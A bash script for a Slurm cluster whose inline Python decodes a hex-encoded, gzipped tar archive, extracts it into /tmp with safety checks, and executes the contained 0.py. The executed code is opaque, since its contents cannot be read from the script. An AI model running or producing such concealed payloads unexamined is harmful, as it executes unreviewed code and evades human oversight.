#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed95416fdb2014c77bf6a740b9d8962282636c9c5439eebec3b6cb545518e38434010bc8da6cda771fd85195a9d26e6d37edfd0ec6d8bcff7b3c7840f0de197df3aa90404dc8d892972d294bfafc3e7daf59cd6e1079ddb0264ece731b5cbe85afbf901f336f1ea49eadd18cb7a45896b4aa59b39acdd16ce0e783e1ddbddbf16555c71175b5eccb96d2a6e184c9a6ea564b2a48dd0bd195352bab15132d1182f1155d75bca979dbd28a16e12968d1517aadda9ebd7441b42a09292a12ff1cb8be72d670dad67d1b426295ec7ad63251b4a2a983df9e49c9c45230527051d77dc17818c368d5b5219a66296923c8ece77be7f65f80e0e1fcea3efe5cff4551bca87f4a4ba8ffb7401d07633d7267378f17c17cc7ddeea0da79484aaf0e32e9ad39a281fbf8115d067f0cddc46e62930543ccedf6dbd7e22ebf159ba881637dbb2cb38b948cb74b9a632b43c97bf9e4b33c4ff8649a2e066bf652f88530c7e3492b7f5eecf76779d2db345f88afe97832a57751c66fbfa709774e06f79710f17454647c121fcf93a08e77f2a9535be982abcd26a8fc7e8ca577c9a3f23b74991f3683d419cf1177c8af13d41b8b24527aec20d5236d3c9258f3a3c471a37817adb3d458b1e3b6bbdf156491e66b61b457fa24af6d948b0eb21c05c914e334aa8ef39ee4723c44b9b5e5ca49f4851f4ef283b5c666e967ed781f83184e3ecd83e4b009a91cd2c564783b444ba93d3e3e74ca6653c76d3ed9939ccb27e5fcbd79187b7918fa68959797e4781c16c072e1c7c0e4b42a7141e222c635c64ac70c6764eebccd46a7e1efb805ae268cf7e6792b1cb9d2497c64364fde7b2f03000000000000000000000000000000000000000000c0ffca2ff775ddf500280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
